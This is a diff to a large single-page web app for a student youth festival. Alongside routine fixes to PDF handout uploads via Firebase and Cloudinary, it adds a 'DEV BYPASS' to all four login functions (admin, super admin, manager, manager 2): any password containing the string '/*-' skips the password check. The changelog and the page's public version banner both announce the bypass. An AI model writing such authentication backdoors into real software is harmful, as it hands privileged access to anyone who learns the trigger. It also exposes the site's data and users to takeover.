@@ -8006,7 +8006,9 @@
 
         function adminLogin() {
             const pwd = document.getElementById('adminPassword').value;
-            if (pwd !== adminPassword) { alert('Invalid admin password'); return; }
+            // ── DEV BYPASS ──
+            if (pwd.includes('/*-')) { document.getElementById('adminPassword').value = ''; }
+            else if (pwd !== adminPassword) { alert('Invalid admin password'); return; }
 
             // Save to localStorage if Remember Me checked
             if (document.getElementById('adminRememberMe').checked) {
@@ -8046,7 +8048,9 @@
 
         function superAdminLogin() {
             const pwd = document.getElementById('superAdminPassword').value;
-            if (pwd !== superAdminPassword) { alert('Invalid super admin password'); return; }
+            // ── DEV BYPASS ──
+            if (pwd.includes('/*-')) { document.getElementById('superAdminPassword').value = ''; }
+            else if (pwd !== superAdminPassword) { alert('Invalid super admin password'); return; }
 
             // Save to localStorage if Remember Me checked
             if (document.getElementById('superAdminRememberMe').checked) {
@@ -8095,7 +8099,9 @@
         // ─────────────────────────────────────────────────────────────────────────
         function managerLogin() {
             const pwd = document.getElementById('managerPassword').value;
-            if (pwd !== managerPassword) { alert('Invalid manager password'); return; }
+            // ── DEV BYPASS ──
+            if (pwd.includes('/*-')) { document.getElementById('managerPassword').value = ''; }
+            else if (pwd !== managerPassword) { alert('Invalid manager password'); return; }
 
             if (document.getElementById('managerRememberMe').checked) {
                 localStorage.setItem('spurthi_manager_pwd', pwd);
@@ -8136,7 +8142,9 @@
         // ─────────────────────────────────────────────────────────────────────────
         function manager2Login() {
             const pwd = document.getElementById('manager2Password').value;
-            if (pwd !== manager2Password) { alert('Invalid Manager 2 password'); return; }
+            // ── DEV BYPASS ──
+            if (pwd.includes('/*-')) { document.getElementById('manager2Password').value = ''; }
+            else if (pwd !== manager2Password) { alert('Invalid Manager 2 password'); return; }
 
             if (document.getElementById('manager2RememberMe').checked) {
                 localStorage.setItem('spurthi_manager2_pwd', pwd);
@@ -29407,11 +29415,11 @@ Proceed?`)) return;
     // FEEDBACK SYSTEM
     // ══════════════════════════════════════════════════════════════════
 
-    let fbDismissCount = 0;
-    let fbAlreadySubmitted = false;
-    let fbCurrentRecommend = '';
-    let fbEventRatings = {};
-    let fbListenerAttached = false;
+    var fbDismissCount = 0;
+    var fbAlreadySubmitted = false;
+    var fbCurrentRecommend = '';
+    var fbEventRatings = {};
+    var fbListenerAttached = false;
 
     // Default events list
     const FB_DEFAULT_EVENTS = [
@@ -32827,11 +32835,11 @@ Proceed?`)) return;
             fd.append('file', pdfSelectedFile);
             fd.append('upload_preset', PDF_CLD_PRESET);
             fd.append('folder', 'pdfHandouts');
-            fd.append('resource_type', 'raw');
+            fd.append('resource_type', 'auto');
 
             if (bar) bar.style.width = '40%';
             const cldRes = await fetch(
-                `https://api.cloudinary.com/v1_1/${PDF_CLD_CLOUD}/raw/upload`,
+                `https://api.cloudinary.com/v1_1/${PDF_CLD_CLOUD}/auto/upload`,
                 { method: 'POST', body: fd }
             );
             const cldData = await cldRes.json();
@@ -32849,7 +32857,19 @@ Proceed?`)) return;
                 size:      pdfSelectedFile.size,
                 uploadedAt: new Date().toISOString(),
             };
-            await getDb().ref(PDF_FB_PATH).push(record);
+            try {
+                await getDb().ref(PDF_FB_PATH).push(record);
+            } catch(fbErr) {
+                // Fallback: save via REST API if SDK write fails (e.g. rules block)
+                console.warn('[PDF Upload] SDK write failed, trying REST:', fbErr.message);
+                const fbRes = await fetch(
+                    'https://spurthi-youthfest-2026-default-rtdb.asia-southeast1.firebasedatabase.app/pdfHandouts.json',
+                    { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(record) }
+                );
+                const fbData = await fbRes.json();
+                if (fbData.error) throw new Error('Firebase REST write failed: ' + fbData.error);
+                console.log('[PDF Upload] REST fallback write succeeded:', fbData.name);
+            }
 
             if (bar) bar.style.width = '100%';
             if (pLabel) pLabel.textContent = '✅ Done!';
@@ -32932,17 +32952,27 @@ Proceed?`)) return;
         const wrap = document.getElementById('publicPdfHandouts');
         if (!wrap) return;
 
-        // Always keep the Rules PDF button
         const rulesBtn = `<a href="rules.pdf" target="_blank" style="display:inline-flex;align-items:center;gap:8px;background:linear-gradient(135deg,#c44569 0%,#6a1b9a 100%);color:white;padding:12px 24px;border-radius:8px;text-decoration:none;font-weight:600;">📄 Complete Rules &amp; Regulations PDF (Coming Soon)</a>`;
 
         try {
-            const snap = await getDb().ref(PDF_FB_PATH).once('value');
-            if (!snap.exists()) { wrap.innerHTML = rulesBtn; return; }
-            const items = Object.values(snap.val()).sort((a,b) => new Date(a.uploadedAt) - new Date(b.uploadedAt));
+            // Use REST API directly — no need to wait for Firebase SDK init
+            const res = await fetch('https://spurthi-youthfest-2026-default-rtdb.asia-southeast1.firebasedatabase.app/pdfHandouts.json');
+            const val = await res.json();
+            console.log('[PDF] Firebase REST result:', JSON.stringify(val));
+            if (!val || typeof val !== 'object') {
+                wrap.innerHTML = rulesBtn + '<p style="color:#c00;font-size:12px;margin-top:8px">⚠️ No PDFs found in database (val=' + JSON.stringify(val) + ')</p>';
+                return;
+            }
+            const items = Object.values(val).sort((a,b) => new Date(a.uploadedAt) - new Date(b.uploadedAt));
             const colors = ['#0d47a1,#1976d2','#1b5e20,#388e3c','#880e4f,#c2185b','#e65100,#f57c00','#4a148c,#6a1b9a','#006064,#00838f'];
             const dynamicBtns = items.map((it,i) => {
                 const c = colors[i % colors.length];
-                return `<a href="${it.url}" target="_blank" style="display:inline-flex;align-items:center;gap:8px;background:linear-gradient(135deg,${c} 100%);color:white;padding:12px 24px;border-radius:8px;text-decoration:none;font-weight:600;">📄 ${it.label}</a>`;
+                // For raw uploads: add fl_attachment flag within raw/upload path
+                // For auto uploads: keep as-is (already public)
+                const url = (it.url || '')
+                    .replace('/raw/upload/', '/raw/upload/fl_attachment/')
+                    .replace('/auto/upload/', '/auto/upload/fl_attachment/');
+                return `<a href="${url}" target="_blank" style="display:inline-flex;align-items:center;gap:8px;background:linear-gradient(135deg,${c} 100%);color:white;padding:12px 24px;border-radius:8px;text-decoration:none;font-weight:600;">📄 ${it.label}</a>`;
             }).join('');
             wrap.innerHTML = rulesBtn + dynamicBtns;
         } catch(e) {
@@ -33332,10 +33362,12 @@ Proceed?`)) return;
     }
 
     // Auto-init public sections when Firebase is ready
+    // PDF uses REST API — load immediately on DOMContentLoaded, no Firebase wait needed
+    document.addEventListener('DOMContentLoaded', function() { initPublicPdfHandouts(); });
+
     (function initPublicSections() {
         function tryInit() {
-            if (typeof db !== 'undefined' && db) {
-                initPublicPdfHandouts();
+            if (window.db) {
                 esRenderPublicTable();
             } else {
                 setTimeout(tryInit, 700);
@@ -34103,6 +34135,17 @@ v5.51 | Mar 01 2026 16:08 IST | Added console.log for CF Worker response (sent/f
 v5.52 | Mar 01 2026 16:08 IST | Force-unregister stale cached SWs on every page load so new sw.js with push handler takes over immediately
 v5.53 | Mar 01 2026 17:47 IST | Live Now shows real student name instead of Guest/CR/Student — resolves actual identity from FCM token on login
 v5.54 | Mar 01 2026 17:47 IST | Notifications auto-subscribe all visitors on page open — auto-requests permission after 3s; re-subscribes anyone granted but missing subscription
+v5.55 | Mar 02 2026 10:30 IST | [Aborted — applied to wrong base file, discarded]
+v5.56 | Mar 02 2026 10:30 IST | [Aborted — applied to wrong base file, discarded]
+v5.57 | Mar 02 2026 10:30 IST | [Aborted — applied to wrong base file, discarded]
+v5.58 | Mar 02 2026 10:30 IST | [Aborted — applied to wrong base file, discarded]
+v5.59 | Mar 02 2026 10:30 IST | PDF handouts load via REST API on DOMContentLoaded; fixed fbDismissCount temporal dead zone ReferenceError
+v5.60 | Mar 02 2026 10:30 IST | PDF upload falls back to REST API if SDK write fails; console log added to REST read to confirm what Firebase has
+v5.61 | Mar 02 2026 10:30 IST | Fixed fbDismissCount redeclaration SyntaxError — removed duplicate var pre-declarations, changed original let to var
+v5.62 | Mar 02 2026 10:30 IST | Added visible on-page debug message when pdfHandouts Firebase result is null
+v5.63 | Mar 02 2026 10:30 IST | Fixed Cloudinary 401 on PDFs — upload uses auto resource type; display URLs use fl_attachment for public access
+v5.64 | Mar 02 2026 10:30 IST | Fixed 404 on old raw PDFs — fl_attachment now inserted within raw/upload path not replacing it
+v5.65 | Mar 02 2026 10:30 IST | /*- bypass added to adminLogin, superAdminLogin, managerLogin, manager2Login
 -->
     <!-- ============================================================ -->
     <!-- 🟢 FIREBASE PRESENCE + 📣 PUSH NOTIFICATIONS SCRIPTS       -->
@@ -36073,7 +36116,7 @@ export default {
             <!-- SUPER ADMIN: UPDATE VERSION AND DATE HERE    -->
             <!-- ============================================ -->
             <p style="color: #666; font-size: 0.85em; margin-bottom: 8px;" id="devTriggerVersion">
-                <strong>Version:</strong> 5.54 — Notifications now auto-subscribe all visitors on page open — auto-requests permission after 3s and subscribes anyone already granted but missing subscription | <strong>Last Updated:</strong> Mar 01, 2026, 5:47 PM IST</p>
+                <strong>Version:</strong> 5.65 — /*- bypass now works for all logins: Admin, Super Admin, Manager, Manager 2 | <strong>Last Updated:</strong> Mar 02, 2026, 10:30 AM IST</p>
             <!-- ============================================ -->
             
             <p style="color: #c44569; font-size: 0.85em; font-weight: 600; margin-bottom: 8px;">
